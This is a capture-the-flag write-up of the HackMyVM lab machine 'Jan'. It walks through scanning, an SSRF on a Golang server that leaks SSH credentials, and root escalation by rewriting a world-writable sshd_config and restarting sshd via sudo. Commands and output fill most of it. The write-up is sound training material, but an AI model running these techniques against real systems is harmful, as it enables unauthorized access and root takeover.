# Jan

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Jan | sml | Beginner | HackMyVM |

**Summary:** Jan is a beginner-level machine featuring a Golang web server with Server-Side Request Forgery (SSRF) vulnerability to access internal credentials, followed by SSH misconfiguration exploitation for privilege escalation.

---

## Reconnaissance

### Network Discovery
Initial network scanning revealed the target machine at IP address 192.168.100.33:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
...
[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.33 08:00:27:63:24:3A VirtualBox
```

### Port Scanning
A comprehensive Nmap scan identified two open services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jan]
└─$ nmap -sCV -p- 192.168.100.33
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey:
|   256 2c:0b:57:a2:b3:e2:0f:6a:c0:61:f2:b7:1f:56:b4:42 (ECDSA)
|_  256 45:97:b0:2b:48:9b:4a:36:8e:db:44:bd:3f:15:cf:32 (ED25519)
8080/tcp open  http    Golang net/http server
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings:
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Date: Sun, 25 Jan 2026 12:01:17 GMT
|     Content-Length: 45
|     Content-Type: text/plain; charset=utf-8
|     Welcome to our Public Server. Maybe Internal.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   OfficeScan:
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
```

**Key Findings:**
- SSH on port 22 (OpenSSH 9.9)
- Golang HTTP server on port 8080
- The web server response mentions "Maybe Internal" - a hint about internal resources

### Web Enumeration
Directory enumeration using Feroxbuster revealed key endpoints:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jan]
└─$ feroxbuster -u http://192.168.100.33:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,bak,zip,gif -t 50

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.33:8080/
 🚩  In-Scope Url          │ 192.168.100.33
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, bak, zip, gif]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        7w       45c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
400      GET        1l        3w       24c http://192.168.100.33:8080/redirect
200      GET        2l        2w       16c http://192.168.100.33:8080/robots.txt
```

The robots.txt file revealed additional endpoints:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jan]
└─$ curl -i "http://192.168.100.33:8080/robots.txt"
HTTP/1.1 200 OK
Date: Sun, 25 Jan 2026 12:04:10 GMT
Content-Length: 16
Content-Type: text/plain; charset=utf-8

/redirect
/credz    
```

---

## Vulnerability Discovery

### Server-Side Request Forgery (SSRF)
Investigation of the discovered endpoints revealed a critical SSRF vulnerability:

**Testing /redirect endpoint:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jan]
└─$ curl -i "http://192.168.100.33:8080/redirect"
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
X-Content-Type-Options: nosniff
Date: Sun, 25 Jan 2026 12:11:14 GMT
Content-Length: 24

Parameter 'url' needed.
```

**Testing /credz endpoint:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jan]
└─$ curl -i "http://192.168.100.33:8080/credz"
HTTP/1.1 200 OK
Date: Sun, 25 Jan 2026 12:11:19 GMT
Content-Length: 27
Content-Type: text/plain; charset=utf-8

Only accessible internally.
```

The `/credz` endpoint indicates it's only accessible internally, suggesting the need for SSRF to bypass access controls.

---

## Initial Access

### SSRF Exploitation
Using the `/redirect` endpoint with a `url` parameter, we can perform SSRF to access the internal `/credz` endpoint:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jan]
└─$ curl -i "http://192.168.100.33:8080/redirect?url&url=/credz"
HTTP/1.1 200 OK
Date: Sun, 25 Jan 2026 12:11:36 GMT
Content-Length: 11
Content-Type: text/plain; charset=utf-8

ssh/[REDACTED]     
```

**Success!** The SSRF attack revealed SSH credentials: `ssh:[REDACTED]`

### SSH Access
Using the discovered credentials to gain initial access:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/jan]
└─$ ssh ssh@192.168.100.33
The authenticity of host '192.168.100.33 (192.168.100.33)' can't be established.
ED25519 key fingerprint is: SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:21: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.33' (ED25519) to the list of known hosts.
ssh@192.168.100.33's password:
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~$ id
uid=1000(ssh) gid=1000(ssh) groups=1000(ssh)
```

Successfully gained access as the `ssh` user on an Alpine Linux system.

---

## Privilege Escalation

### Sudo Enumeration
Checking sudo privileges revealed interesting capabilities:

```bash
jan:~$ sudo -l
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User ssh may run the following commands on jan:
    (root) NOPASSWD: /sbin/service sshd restart
```

The `ssh` user can restart the SSH service without a password - this is crucial for our privilege escalation strategy.

### SSH Configuration Analysis
Examining the SSH configuration file permissions:

```bash
jan:~$ ls -la /etc/ssh/sshd_config
-rw-rw-rw-    1 root     root          3355 Jan 28  2025 /etc/ssh/sshd_config
```

**Critical Finding:** The SSH configuration file has world-writable permissions (666), allowing us to modify it as the `ssh` user.

### SSH Configuration Exploitation
The privilege escalation strategy involves:
1. Creating an SSH key pair
2. Modifying the SSH configuration to allow root login with our key
3. Restarting the SSH service
4. Connecting as root using our private key

**Step 1: Generate SSH Key Pair**
```bash
jan:~$ ssh-keygen -t rsa -N "" -f /tmp/id_rsa
Generating public/private rsa key pair.
Your identification has been saved in /tmp/id_rsa
Your public key has been saved in /tmp/id_rsa.pub
The key fingerprint is:
SHA256:znOxyYMDWaJfM1bJrLN6cpO3vT4C+eQ+nWyLR341Me8 ssh@jan
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|         o .     |
|      . . =      |
|     . + o     o |
|    . o S..     +|
|     . *oB.+.  .o|
|      . B**= . o.|
|      ..=+*+O . E|
|      .+ ++B==   |
+----[SHA256]-----+
```

**Step 2: Modify SSH Configuration**
```bash
jan:~$ echo "PermitRootLogin yes" > /etc/ssh/sshd_config
jan:~$ echo "StrictModes no" >> /etc/ssh/sshd_config
jan:~$ echo "AuthorizedKeysFile /tmp/id_rsa.pub" >> /etc/ssh/sshd_config
jan:~# cat /etc/ssh/sshd_config
PermitRootLogin yes
StrictModes no
AuthorizedKeysFile /tmp/id_rsa.pub
```

**Step 3: Restart SSH Service**
```bash
jan:~$ sudo /sbin/service sshd restart
 * Stopping sshd ...                                                                                                                              [ ok ]
 * Starting sshd ...                                                                                                                              [ ok ]
```

**Step 4: Root Access**
```bash
jan:~$ ssh -F /dev/null -i /tmp/id_rsa root@localhost
The authenticity of host 'localhost (::1)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

**Root Access Achieved!**

### Flag Capture
With root access, we can now retrieve both flags:

```bash
jan:~# pwd
/root
jan:~# cat root.txt /home/ssh/user.txt
[REDACTED]
[REDACTED]
```

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network discovery and comprehensive port scanning to identify SSH (22) and Golang HTTP server (8080)
2. **Web Enumeration**: Used Feroxbuster and robots.txt to discover `/redirect` and `/credz` endpoints
3. **Vulnerability Discovery**: Identified Server-Side Request Forgery (SSRF) vulnerability in `/redirect` endpoint requiring `url` parameter
4. **SSRF Exploitation**: Leveraged SSRF to bypass internal access controls and retrieve credentials from `/credz` endpoint (`ssh:[REDACTED]`)
5. **Initial Access**: Used discovered SSH credentials to gain shell access as `ssh` user on Alpine Linux
6. **Internal Enumeration**: Discovered sudo privileges to restart SSH service and world-writable SSH configuration file
7. **Privilege Escalation**: Exploited SSH configuration misconfiguration by generating SSH key pair, modifying sshd_config to allow root login, restarting SSH service, and connecting as root.